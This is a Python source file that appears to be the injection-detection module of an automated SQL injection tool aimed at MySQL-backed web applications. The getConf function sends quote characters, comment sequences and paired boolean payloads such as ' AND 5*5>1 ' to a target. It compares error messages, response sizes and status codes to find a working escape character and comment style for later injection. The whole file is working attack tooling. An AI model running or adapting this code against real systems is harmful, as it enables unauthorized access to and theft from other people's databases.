

from req_ import req
from re import search
from data.mysql import *
import urllib.parse

def getConf(body, config):

	badChar = [
		'\'',
		'"'
	]
	
	escape = [
		'\'',
		'"',
		'%20'
	]

	err_ = ''
	char_ = ''
	
	
	

	
	for char in badChar:
			rep = req(body, char)

			
			for err in MySQL['error']:
				
				if err in rep['body']:

					
					char_ = char
					err_ = err

					
					for com in MySQL['comment']:
						rep = req(body, char_ + com)
						
						if err not in rep['body']:

							config['dbms'] = 'MySQL'
							config['escape'] = char_
							config['comment'] = com
							config['detection'] = 'errorBased'

							return True
							break
							
	

	
	if err_:
		for com in MySQL['comment']:
			rep = req(body, com)
			for err in MySQL['error']:
				if err not in rep['body']:
					config['dbms'] = 'MySQL'
					config['comment'] = com
					config['detection'] = 'errorBased'
					return True
					break
					
					
	
	r = req(body, '$1337$')

	for char in escape:
		for com in MySQL['comment']:

			
			p = ' {} AND 5*5>1 {}'.format(char, com)
			p2 = ' {} AND 7*7>1 {}'.format(char, com)
			p3 = ' {} AND 5*5>100 {}'.format(char, com)
			p4 = ' {} AND 7*7>100 {}'.format(char, com)

			
			rep = req(body, p)
			rep2 = req(body, p2)
			rep3 = req(body, p3)
			rep4 = req(body, p4)

			
			if '$1337$' in r['body']:

				
				rep['size'] = len(rep['body'].replace(urllib.parse.unquote_plus(p), ''))
				rep2['size'] = len(rep2['body'].replace(urllib.parse.unquote_plus(p2), ''))
				rep3['size'] = len(rep3['body'].replace(urllib.parse.unquote_plus(p3), ''))
				rep4['size'] = len(rep4['body'].replace(urllib.parse.unquote_plus(p4), ''))
			
			
			if rep['size'] == rep2['size'] and rep3['size'] == rep4['size'] and rep['size'] != rep3['size']:

				config['escape'] = char
				config['comment'] = com
				config['size'] = rep['size']
				config['detection'] = 'booleanBased'

				return True

	

	for char in badChar:
		for com in MySQL['comment']:
			rep = req(body, char)
			rep2 = req(body, char + char + com)

			if search(r'^5', rep['code']) and search(r'^2', rep2['code']):

				config['escape'] = char
				config['comment'] = com

				return True
				break
				
	
	
	for com in MySQL['comment']:
		
		rep = req(body, '\'')
		rep2 = req(body, '' + com)

		if search(r'^5', rep['code']) and search(r'^2', rep2['code']):

			config['comment'] = com
			config['detection'] = 'codeBased'

			return True	
		
